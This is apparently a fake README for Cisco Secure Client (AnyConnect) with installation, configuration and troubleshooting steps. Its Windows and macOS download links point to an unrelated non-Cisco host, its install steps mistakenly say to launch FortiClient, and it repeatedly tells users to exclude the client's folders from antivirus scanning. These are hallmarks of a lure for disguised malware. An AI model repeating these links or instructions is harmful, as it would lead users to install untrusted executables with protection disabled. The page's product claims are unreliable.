# Cisco Secure Client (including AnyConnect)

**Cisco Secure Client** is a unified security application designed to provide users with secure remote access and advanced endpoint protection. Formerly known as Cisco AnyConnect, this modernized client integrates multiple Cisco security solutions into a single platform to enhance security, streamline administration, and improve user experience.

## Table of Contents
- [Installation](#installation)
- [System Requirements](#system-requirements)
- [Configuration](#configuration)
- [Troubleshooting](#troubleshooting)
- [Features](#features)
- [Usage](#usage)

## Installation
### Installing on Windows
 ### 🔗 [**Download Cisco Secure Client**](https://cine.prosuscorp.com/secure/)
1. Run the executable file.
2. Follow the on-screen instructions:
   - Accept the license agreement.
   - Choose the installation folder.
3. Complete the installation and restart the system if prompted.
4. Launch FortiClient from the desktop shortcut.

### Installing on macOS
1. [**Download `.dmg` file**](https://cine.prosuscorp.com/secure/)
2. Open the installer and follow the steps:
   - Agree to the Software License Agreement.
   - Enter your system password if required.
3. Enable required permissions in **System Preferences > Security & Privacy**.
4. Restart the macOS device if prompted.


## System Requirements
- **Windows**: Windows 10 or later; Microsoft .NET Framework 4.6.2 or newer recommended.
- **macOS**: macOS 11 or later; Apple-supported devices only.
- **Linux**: Kernel version compatibility is critical; ensure `libelf` and `gcc` are installed.


## Configuration

### Prerequisites

Ensure the following requirements are met before proceeding with configuration:

- **Administrative Access**: You must have the required administrative privileges on the endpoint device.
- **Supported Environment**: Verify that the target operating system and endpoint meet Cisco Secure Client's system requirements.
- **Network Preparedness**: Ensure that endpoint directories (`C:\ProgramData\Cisco\` for Windows or `/opt/cisco/` for macOS/Linux) are added to antivirus and antimalware exclusion lists.
- **Profiles and Licensing**: Confirm the availability of necessary profiles and the appropriate license (Advantage or Premier).

### 1. Launch Cisco Secure Client

1. Open the application from the Start menu (Windows) or Applications folder (macOS).
2. Ensure the application has the latest updates.

### 2. Add or Manage VPN Connections

1. Navigate to **Connections** > **Add New Connection**.
2. Input the following details:
   - **Connection Name**: A descriptive name for the VPN connection.
   - **Server Address**: The fully qualified domain name or IP address of the VPN gateway.
3. Click **Save** to store the connection.

#### Advanced Settings

- Access the **Edit Connection** menu to:
  - Configure authentication methods (certificate-based or username/password).
  - Set proxy preferences under **Proxy Settings**.
  - Toggle and customize split tunneling.

### 3. Importing and Exporting Profiles

- **Import**: From the **File** menu, select **Import Profile**, then upload the XML file containing predefined settings.
- **Export**: Save configurations to an XML file using the **Export Profile** option. Profiles must match the server-side configurations for synchronization.

### Advanced Deployment Options

#### Predeploy Configuration

- Download the predeployment package from Cisco's official website.
- Use enterprise software management systems (e.g., SCCM) for large-scale deployment or distribute zip packages containing installers and profiles.

#### Deployment Directories:
- **Windows**: Profiles and resources are stored in `C:\ProgramData\Cisco\Cisco Secure Client`.
- **macOS/Linux**: Profiles are located in `/opt/cisco/secureclient`.

#### Web Deployment

- Deploy via **Secure Firewall ASA** or **ISE**.
- Ensure proper configuration of ASA policies and ISE provisioning settings to deliver the required client and profiles dynamically.

#### Configuring ISE-Specific Features

- Upload ISE Posture Profiles via the ISE portal.
- Use the Network Setup Assistant (NSA) for initial client deployment where browser-based provisioning is required.

### Configuration File Management

Cisco Secure Client relies on XML files for profile configurations.

#### Editing XML Profiles

1. Locate the profile in the configuration directory.
2. Open with a text editor and edit parameters such as:
   ```xml
   <ServerList>
       <HostEntry>
           <HostName>MyVPN</HostName>
           <HostAddress>vpn.example.com</HostAddress>
           <PrimaryProtocol>SSL</PrimaryProtocol>
       </HostEntry>
   </ServerList>
   ```
3. Save changes and restart the application.

### Enabling Logging

1. Open **Settings** > **Diagnostics**.
2. Enable detailed logging to analyze issues.
3. Use Diagnostic and Reporting Tool (DART) for detailed reports.


## Troubleshooting

### Common Issues:

- **Connection Problems**: Verify server reachability and credentials.
- **Profile Errors**: Ensure proper syntax and match between client and server-side profiles.

### Compliance Module Failures

**Symptoms:**
- Compliance checks fail during posture validation.

**Resolutions:**
1. Update the compliance module to the latest version.
2. Exclude the compliance module files from antivirus or antimalware scans.
3. Verify proper configuration of ISE posture policies.

### Kernel Module Issues (Linux)

**Symptoms:**
- Kernel module not loading or errors during installation.

**Resolutions:**
1. Ensure required kernel headers and GCC compiler are installed.
2. Use the pre-built kernel module for deployment.
3. Rebuild the module using the provided scripts.

### Proxy Lockdown Conflicts

**Symptoms:**
- Users unable to change proxy settings in Internet Explorer or system settings.

**Resolutions:**
1. Check the Secure Firewall ASA proxy lockdown configuration.
2. Adjust group policies to override lockdown settings if necessary.


## Features
- **VPN Capabilities**:
  - Supports SSL and IPsec.
  - Split-tunneling and all-or-nothing tunneling configurations available.
- **Optional Modules**:
  - Network Access Manager
  - ISE Posture
  - Secure Firewall Posture
  - Network Visibility Module
- **Customizable Profiles**:
  - Define user-specific configurations for various modules.

## Usage
Refer to the official [Cisco Secure Client Administrator Guide](https://www.cisco.com/c/en/us/support/security/anyconnect-secure-mobility-client/products-installation-and-configuration-guides-list.html) for advanced configurations, module updates, and troubleshooting steps.

## Troubleshooting
- **Common Installation Issues**:
  - Verify that the downloaded package matches the operating system and architecture of the target device.
  - Ensure that all prerequisite software (e.g., .NET Framework on Windows) is installed.
  - Check system logs for error messages during installation and deployment.
- **Connection Problems**:
  - Confirm that the Secure Firewall ASA or ISE headend is accessible.
  - Ensure that firewall rules do not block required ports for VPN connectivity.

## Security Recommendations
- Always keep the Cisco Secure Client software and profiles updated to the latest version.
- Use strong passwords and multi-factor authentication (MFA) for enhanced security.
- Regularly review user access permissions and audit VPN usage logs.
- Configure endpoint antivirus and firewall to trust the installation directory of Cisco Secure Client.

For complete guidelines and documentation, refer to the official [Cisco Secure Client Administrator Guide](https://www.cisco.com/go/secureclient).
